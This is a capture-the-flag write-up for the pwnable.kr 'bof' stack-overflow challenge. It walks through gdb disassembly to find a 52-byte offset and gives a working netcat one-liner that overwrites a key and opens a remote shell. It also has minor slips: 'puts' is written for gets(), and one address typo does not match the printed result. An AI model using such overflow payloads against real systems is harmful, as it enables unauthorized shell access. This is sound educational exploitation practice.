###

Welp, let's try and inspect the given `bof.c` code.

```c
#include <stdio.h>                                             
#include <string.h>                                            
#include <stdlib.h>                                            
void func(int key){                                            
    char overflowme[32];                                       
    printf("overflow me : ");                                  
    gets(overflowme);   // smash me!
    if(key == 0xcafebabe){                                     
        system("/bin/sh");                                     
    }                                                          
    else{                                                      
        printf("Nah..\n");                                     
    }                                                          
}                                                              
int main(int argc, char* argv[]){                              
    func(0xdeadbeef);                                          
    return 0;                                                  
}                                                              

```

From the pretty obvious wordings, and description of the CTF, we can understand that some overflow should occur here, more accurately,
we input something into `char overflowme[32]` through `puts` (which is very vulnerable) and hope to overwrite `int key`.

Let's try to find the addresses of `key` and of `overflowme`
```
(gdb) b func
Breakpoint 1 at 0x632
(gdb) r
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x56555632 in func ()
(gdb) disas func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
=> 0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7c73260 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7c728b0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7c48150 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7c73260 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7d33930 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
(gdb) 
```

We can see pretty quickly that prior to the `gets` call we have some preparation to it, mainly the `lea` and `mov`:
```
0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
0x5655564c <+32>:    mov    %eax,(%esp)
```

This probably means that `overflowme` is at -0x2c(%ebp), we can even verify it by giving an input and then inspecting that memory address:
```
Breakpoint 1, 0x56555632 in func ()
(gdb) disas func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
=> 0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7c73260 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7c728b0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7c48150 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7c73260 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7d33930 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
(gdb) b *0x56555654
Breakpoint 2 at 0x56555654
(gdb) c
Continuing.
overflow me : 
hey

Breakpoint 2, 0x56555654 in func ()
(gdb) x/1s $ebp-0x2c
0xffffce4c:     "hey"
```
Great!
Now let's grab `key`'s address, we can be assured it's 0x8(%ebp) since it is used in the `cmpl` instruction with `0xcafebabe`:
```
(gdb) x/1xw $ebp+0x8
0xffffce80:     0xdeadbeef
```

Now let's subtract the address of `key` from `overflowme` since the argument is always in higher address than a local variable:
```python
In [6]: 0xffffce80 -0xfffce4c                                                                                                                                                                          
Out[6]: 52
```

So now we know that we need to give as input at least 52 characters before we start overflowing into the address of `key`, meaning that we can overwrite the value of it to be `0xcafebabe`:  
`(python2 -c "print '1'*52 + '\xbe\xba\xfe\xca'" && cat) | nc pwnable.kr 9000`

And we got a `bof` shell on the remote machine :)
